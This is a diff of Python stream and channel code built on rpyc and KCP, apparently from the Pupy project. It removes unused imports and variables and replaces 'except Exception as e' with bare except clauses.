@@ -12,6 +12,8 @@ __all__ = [
 
 try:
     import kcp
+    assert kcp
+
     __all__.append(
         'PupyUDPSocketStream'
     )
@@ -19,14 +21,14 @@ except:
     logger.warning('Datagram based stream is not available: KCP missing')
 
 import sys
-from rpyc.core import SocketStream, Connection, Channel
+from rpyc.core import SocketStream, Channel
 import socket
 import time
 import errno
 import traceback
 import zlib
 
-from rpyc.lib.compat import select, select_error, get_exc_errno, maxint
+from rpyc.lib.compat import select, select_error, get_exc_errno
 
 from network.lib.buffer import Buffer
 
@@ -96,7 +98,6 @@ class PupyChannel(Channel):
         required_length = length + len(self.FLUSHER)
         # print "WAIT FOR", required_length
 
-        data = []
         decompressor = None
 
         if compressed:
@@ -308,7 +309,7 @@ class PupySocketStream(SocketStream):
             self.close()
             raise
 
-        except Exception as e:
+        except:
             logger.debug(traceback.format_exc())
             self.close()
             raise
@@ -342,7 +343,7 @@ class PupySocketStream(SocketStream):
             self.close()
             raise
 
-        except Exception as e:
+        except:
             logger.debug(traceback.format_exc())
             self.close()
             raise
@@ -368,7 +369,6 @@ class PupyUDPSocketStream(object):
         if len(sock) == 3:
             self.kcp = sock[2]
         else:
-            import kcp
             if client_side:
                 dst = self.sock.fileno()
             else:
@@ -504,7 +504,7 @@ class PupyUDPSocketStream(object):
 
             return self.upstream.read(count)
 
-        except Exception as e:
+        except:
             logger.debug(traceback.format_exc())
 
     def insert(self, data):
@@ -525,7 +525,7 @@ class PupyUDPSocketStream(object):
                 if notify:
                     self.transport.upstream_recv(self.buf_out)
 
-        except Exception as e:
+        except:
             logger.debug(traceback.format_exc())
 
     def consume(self):
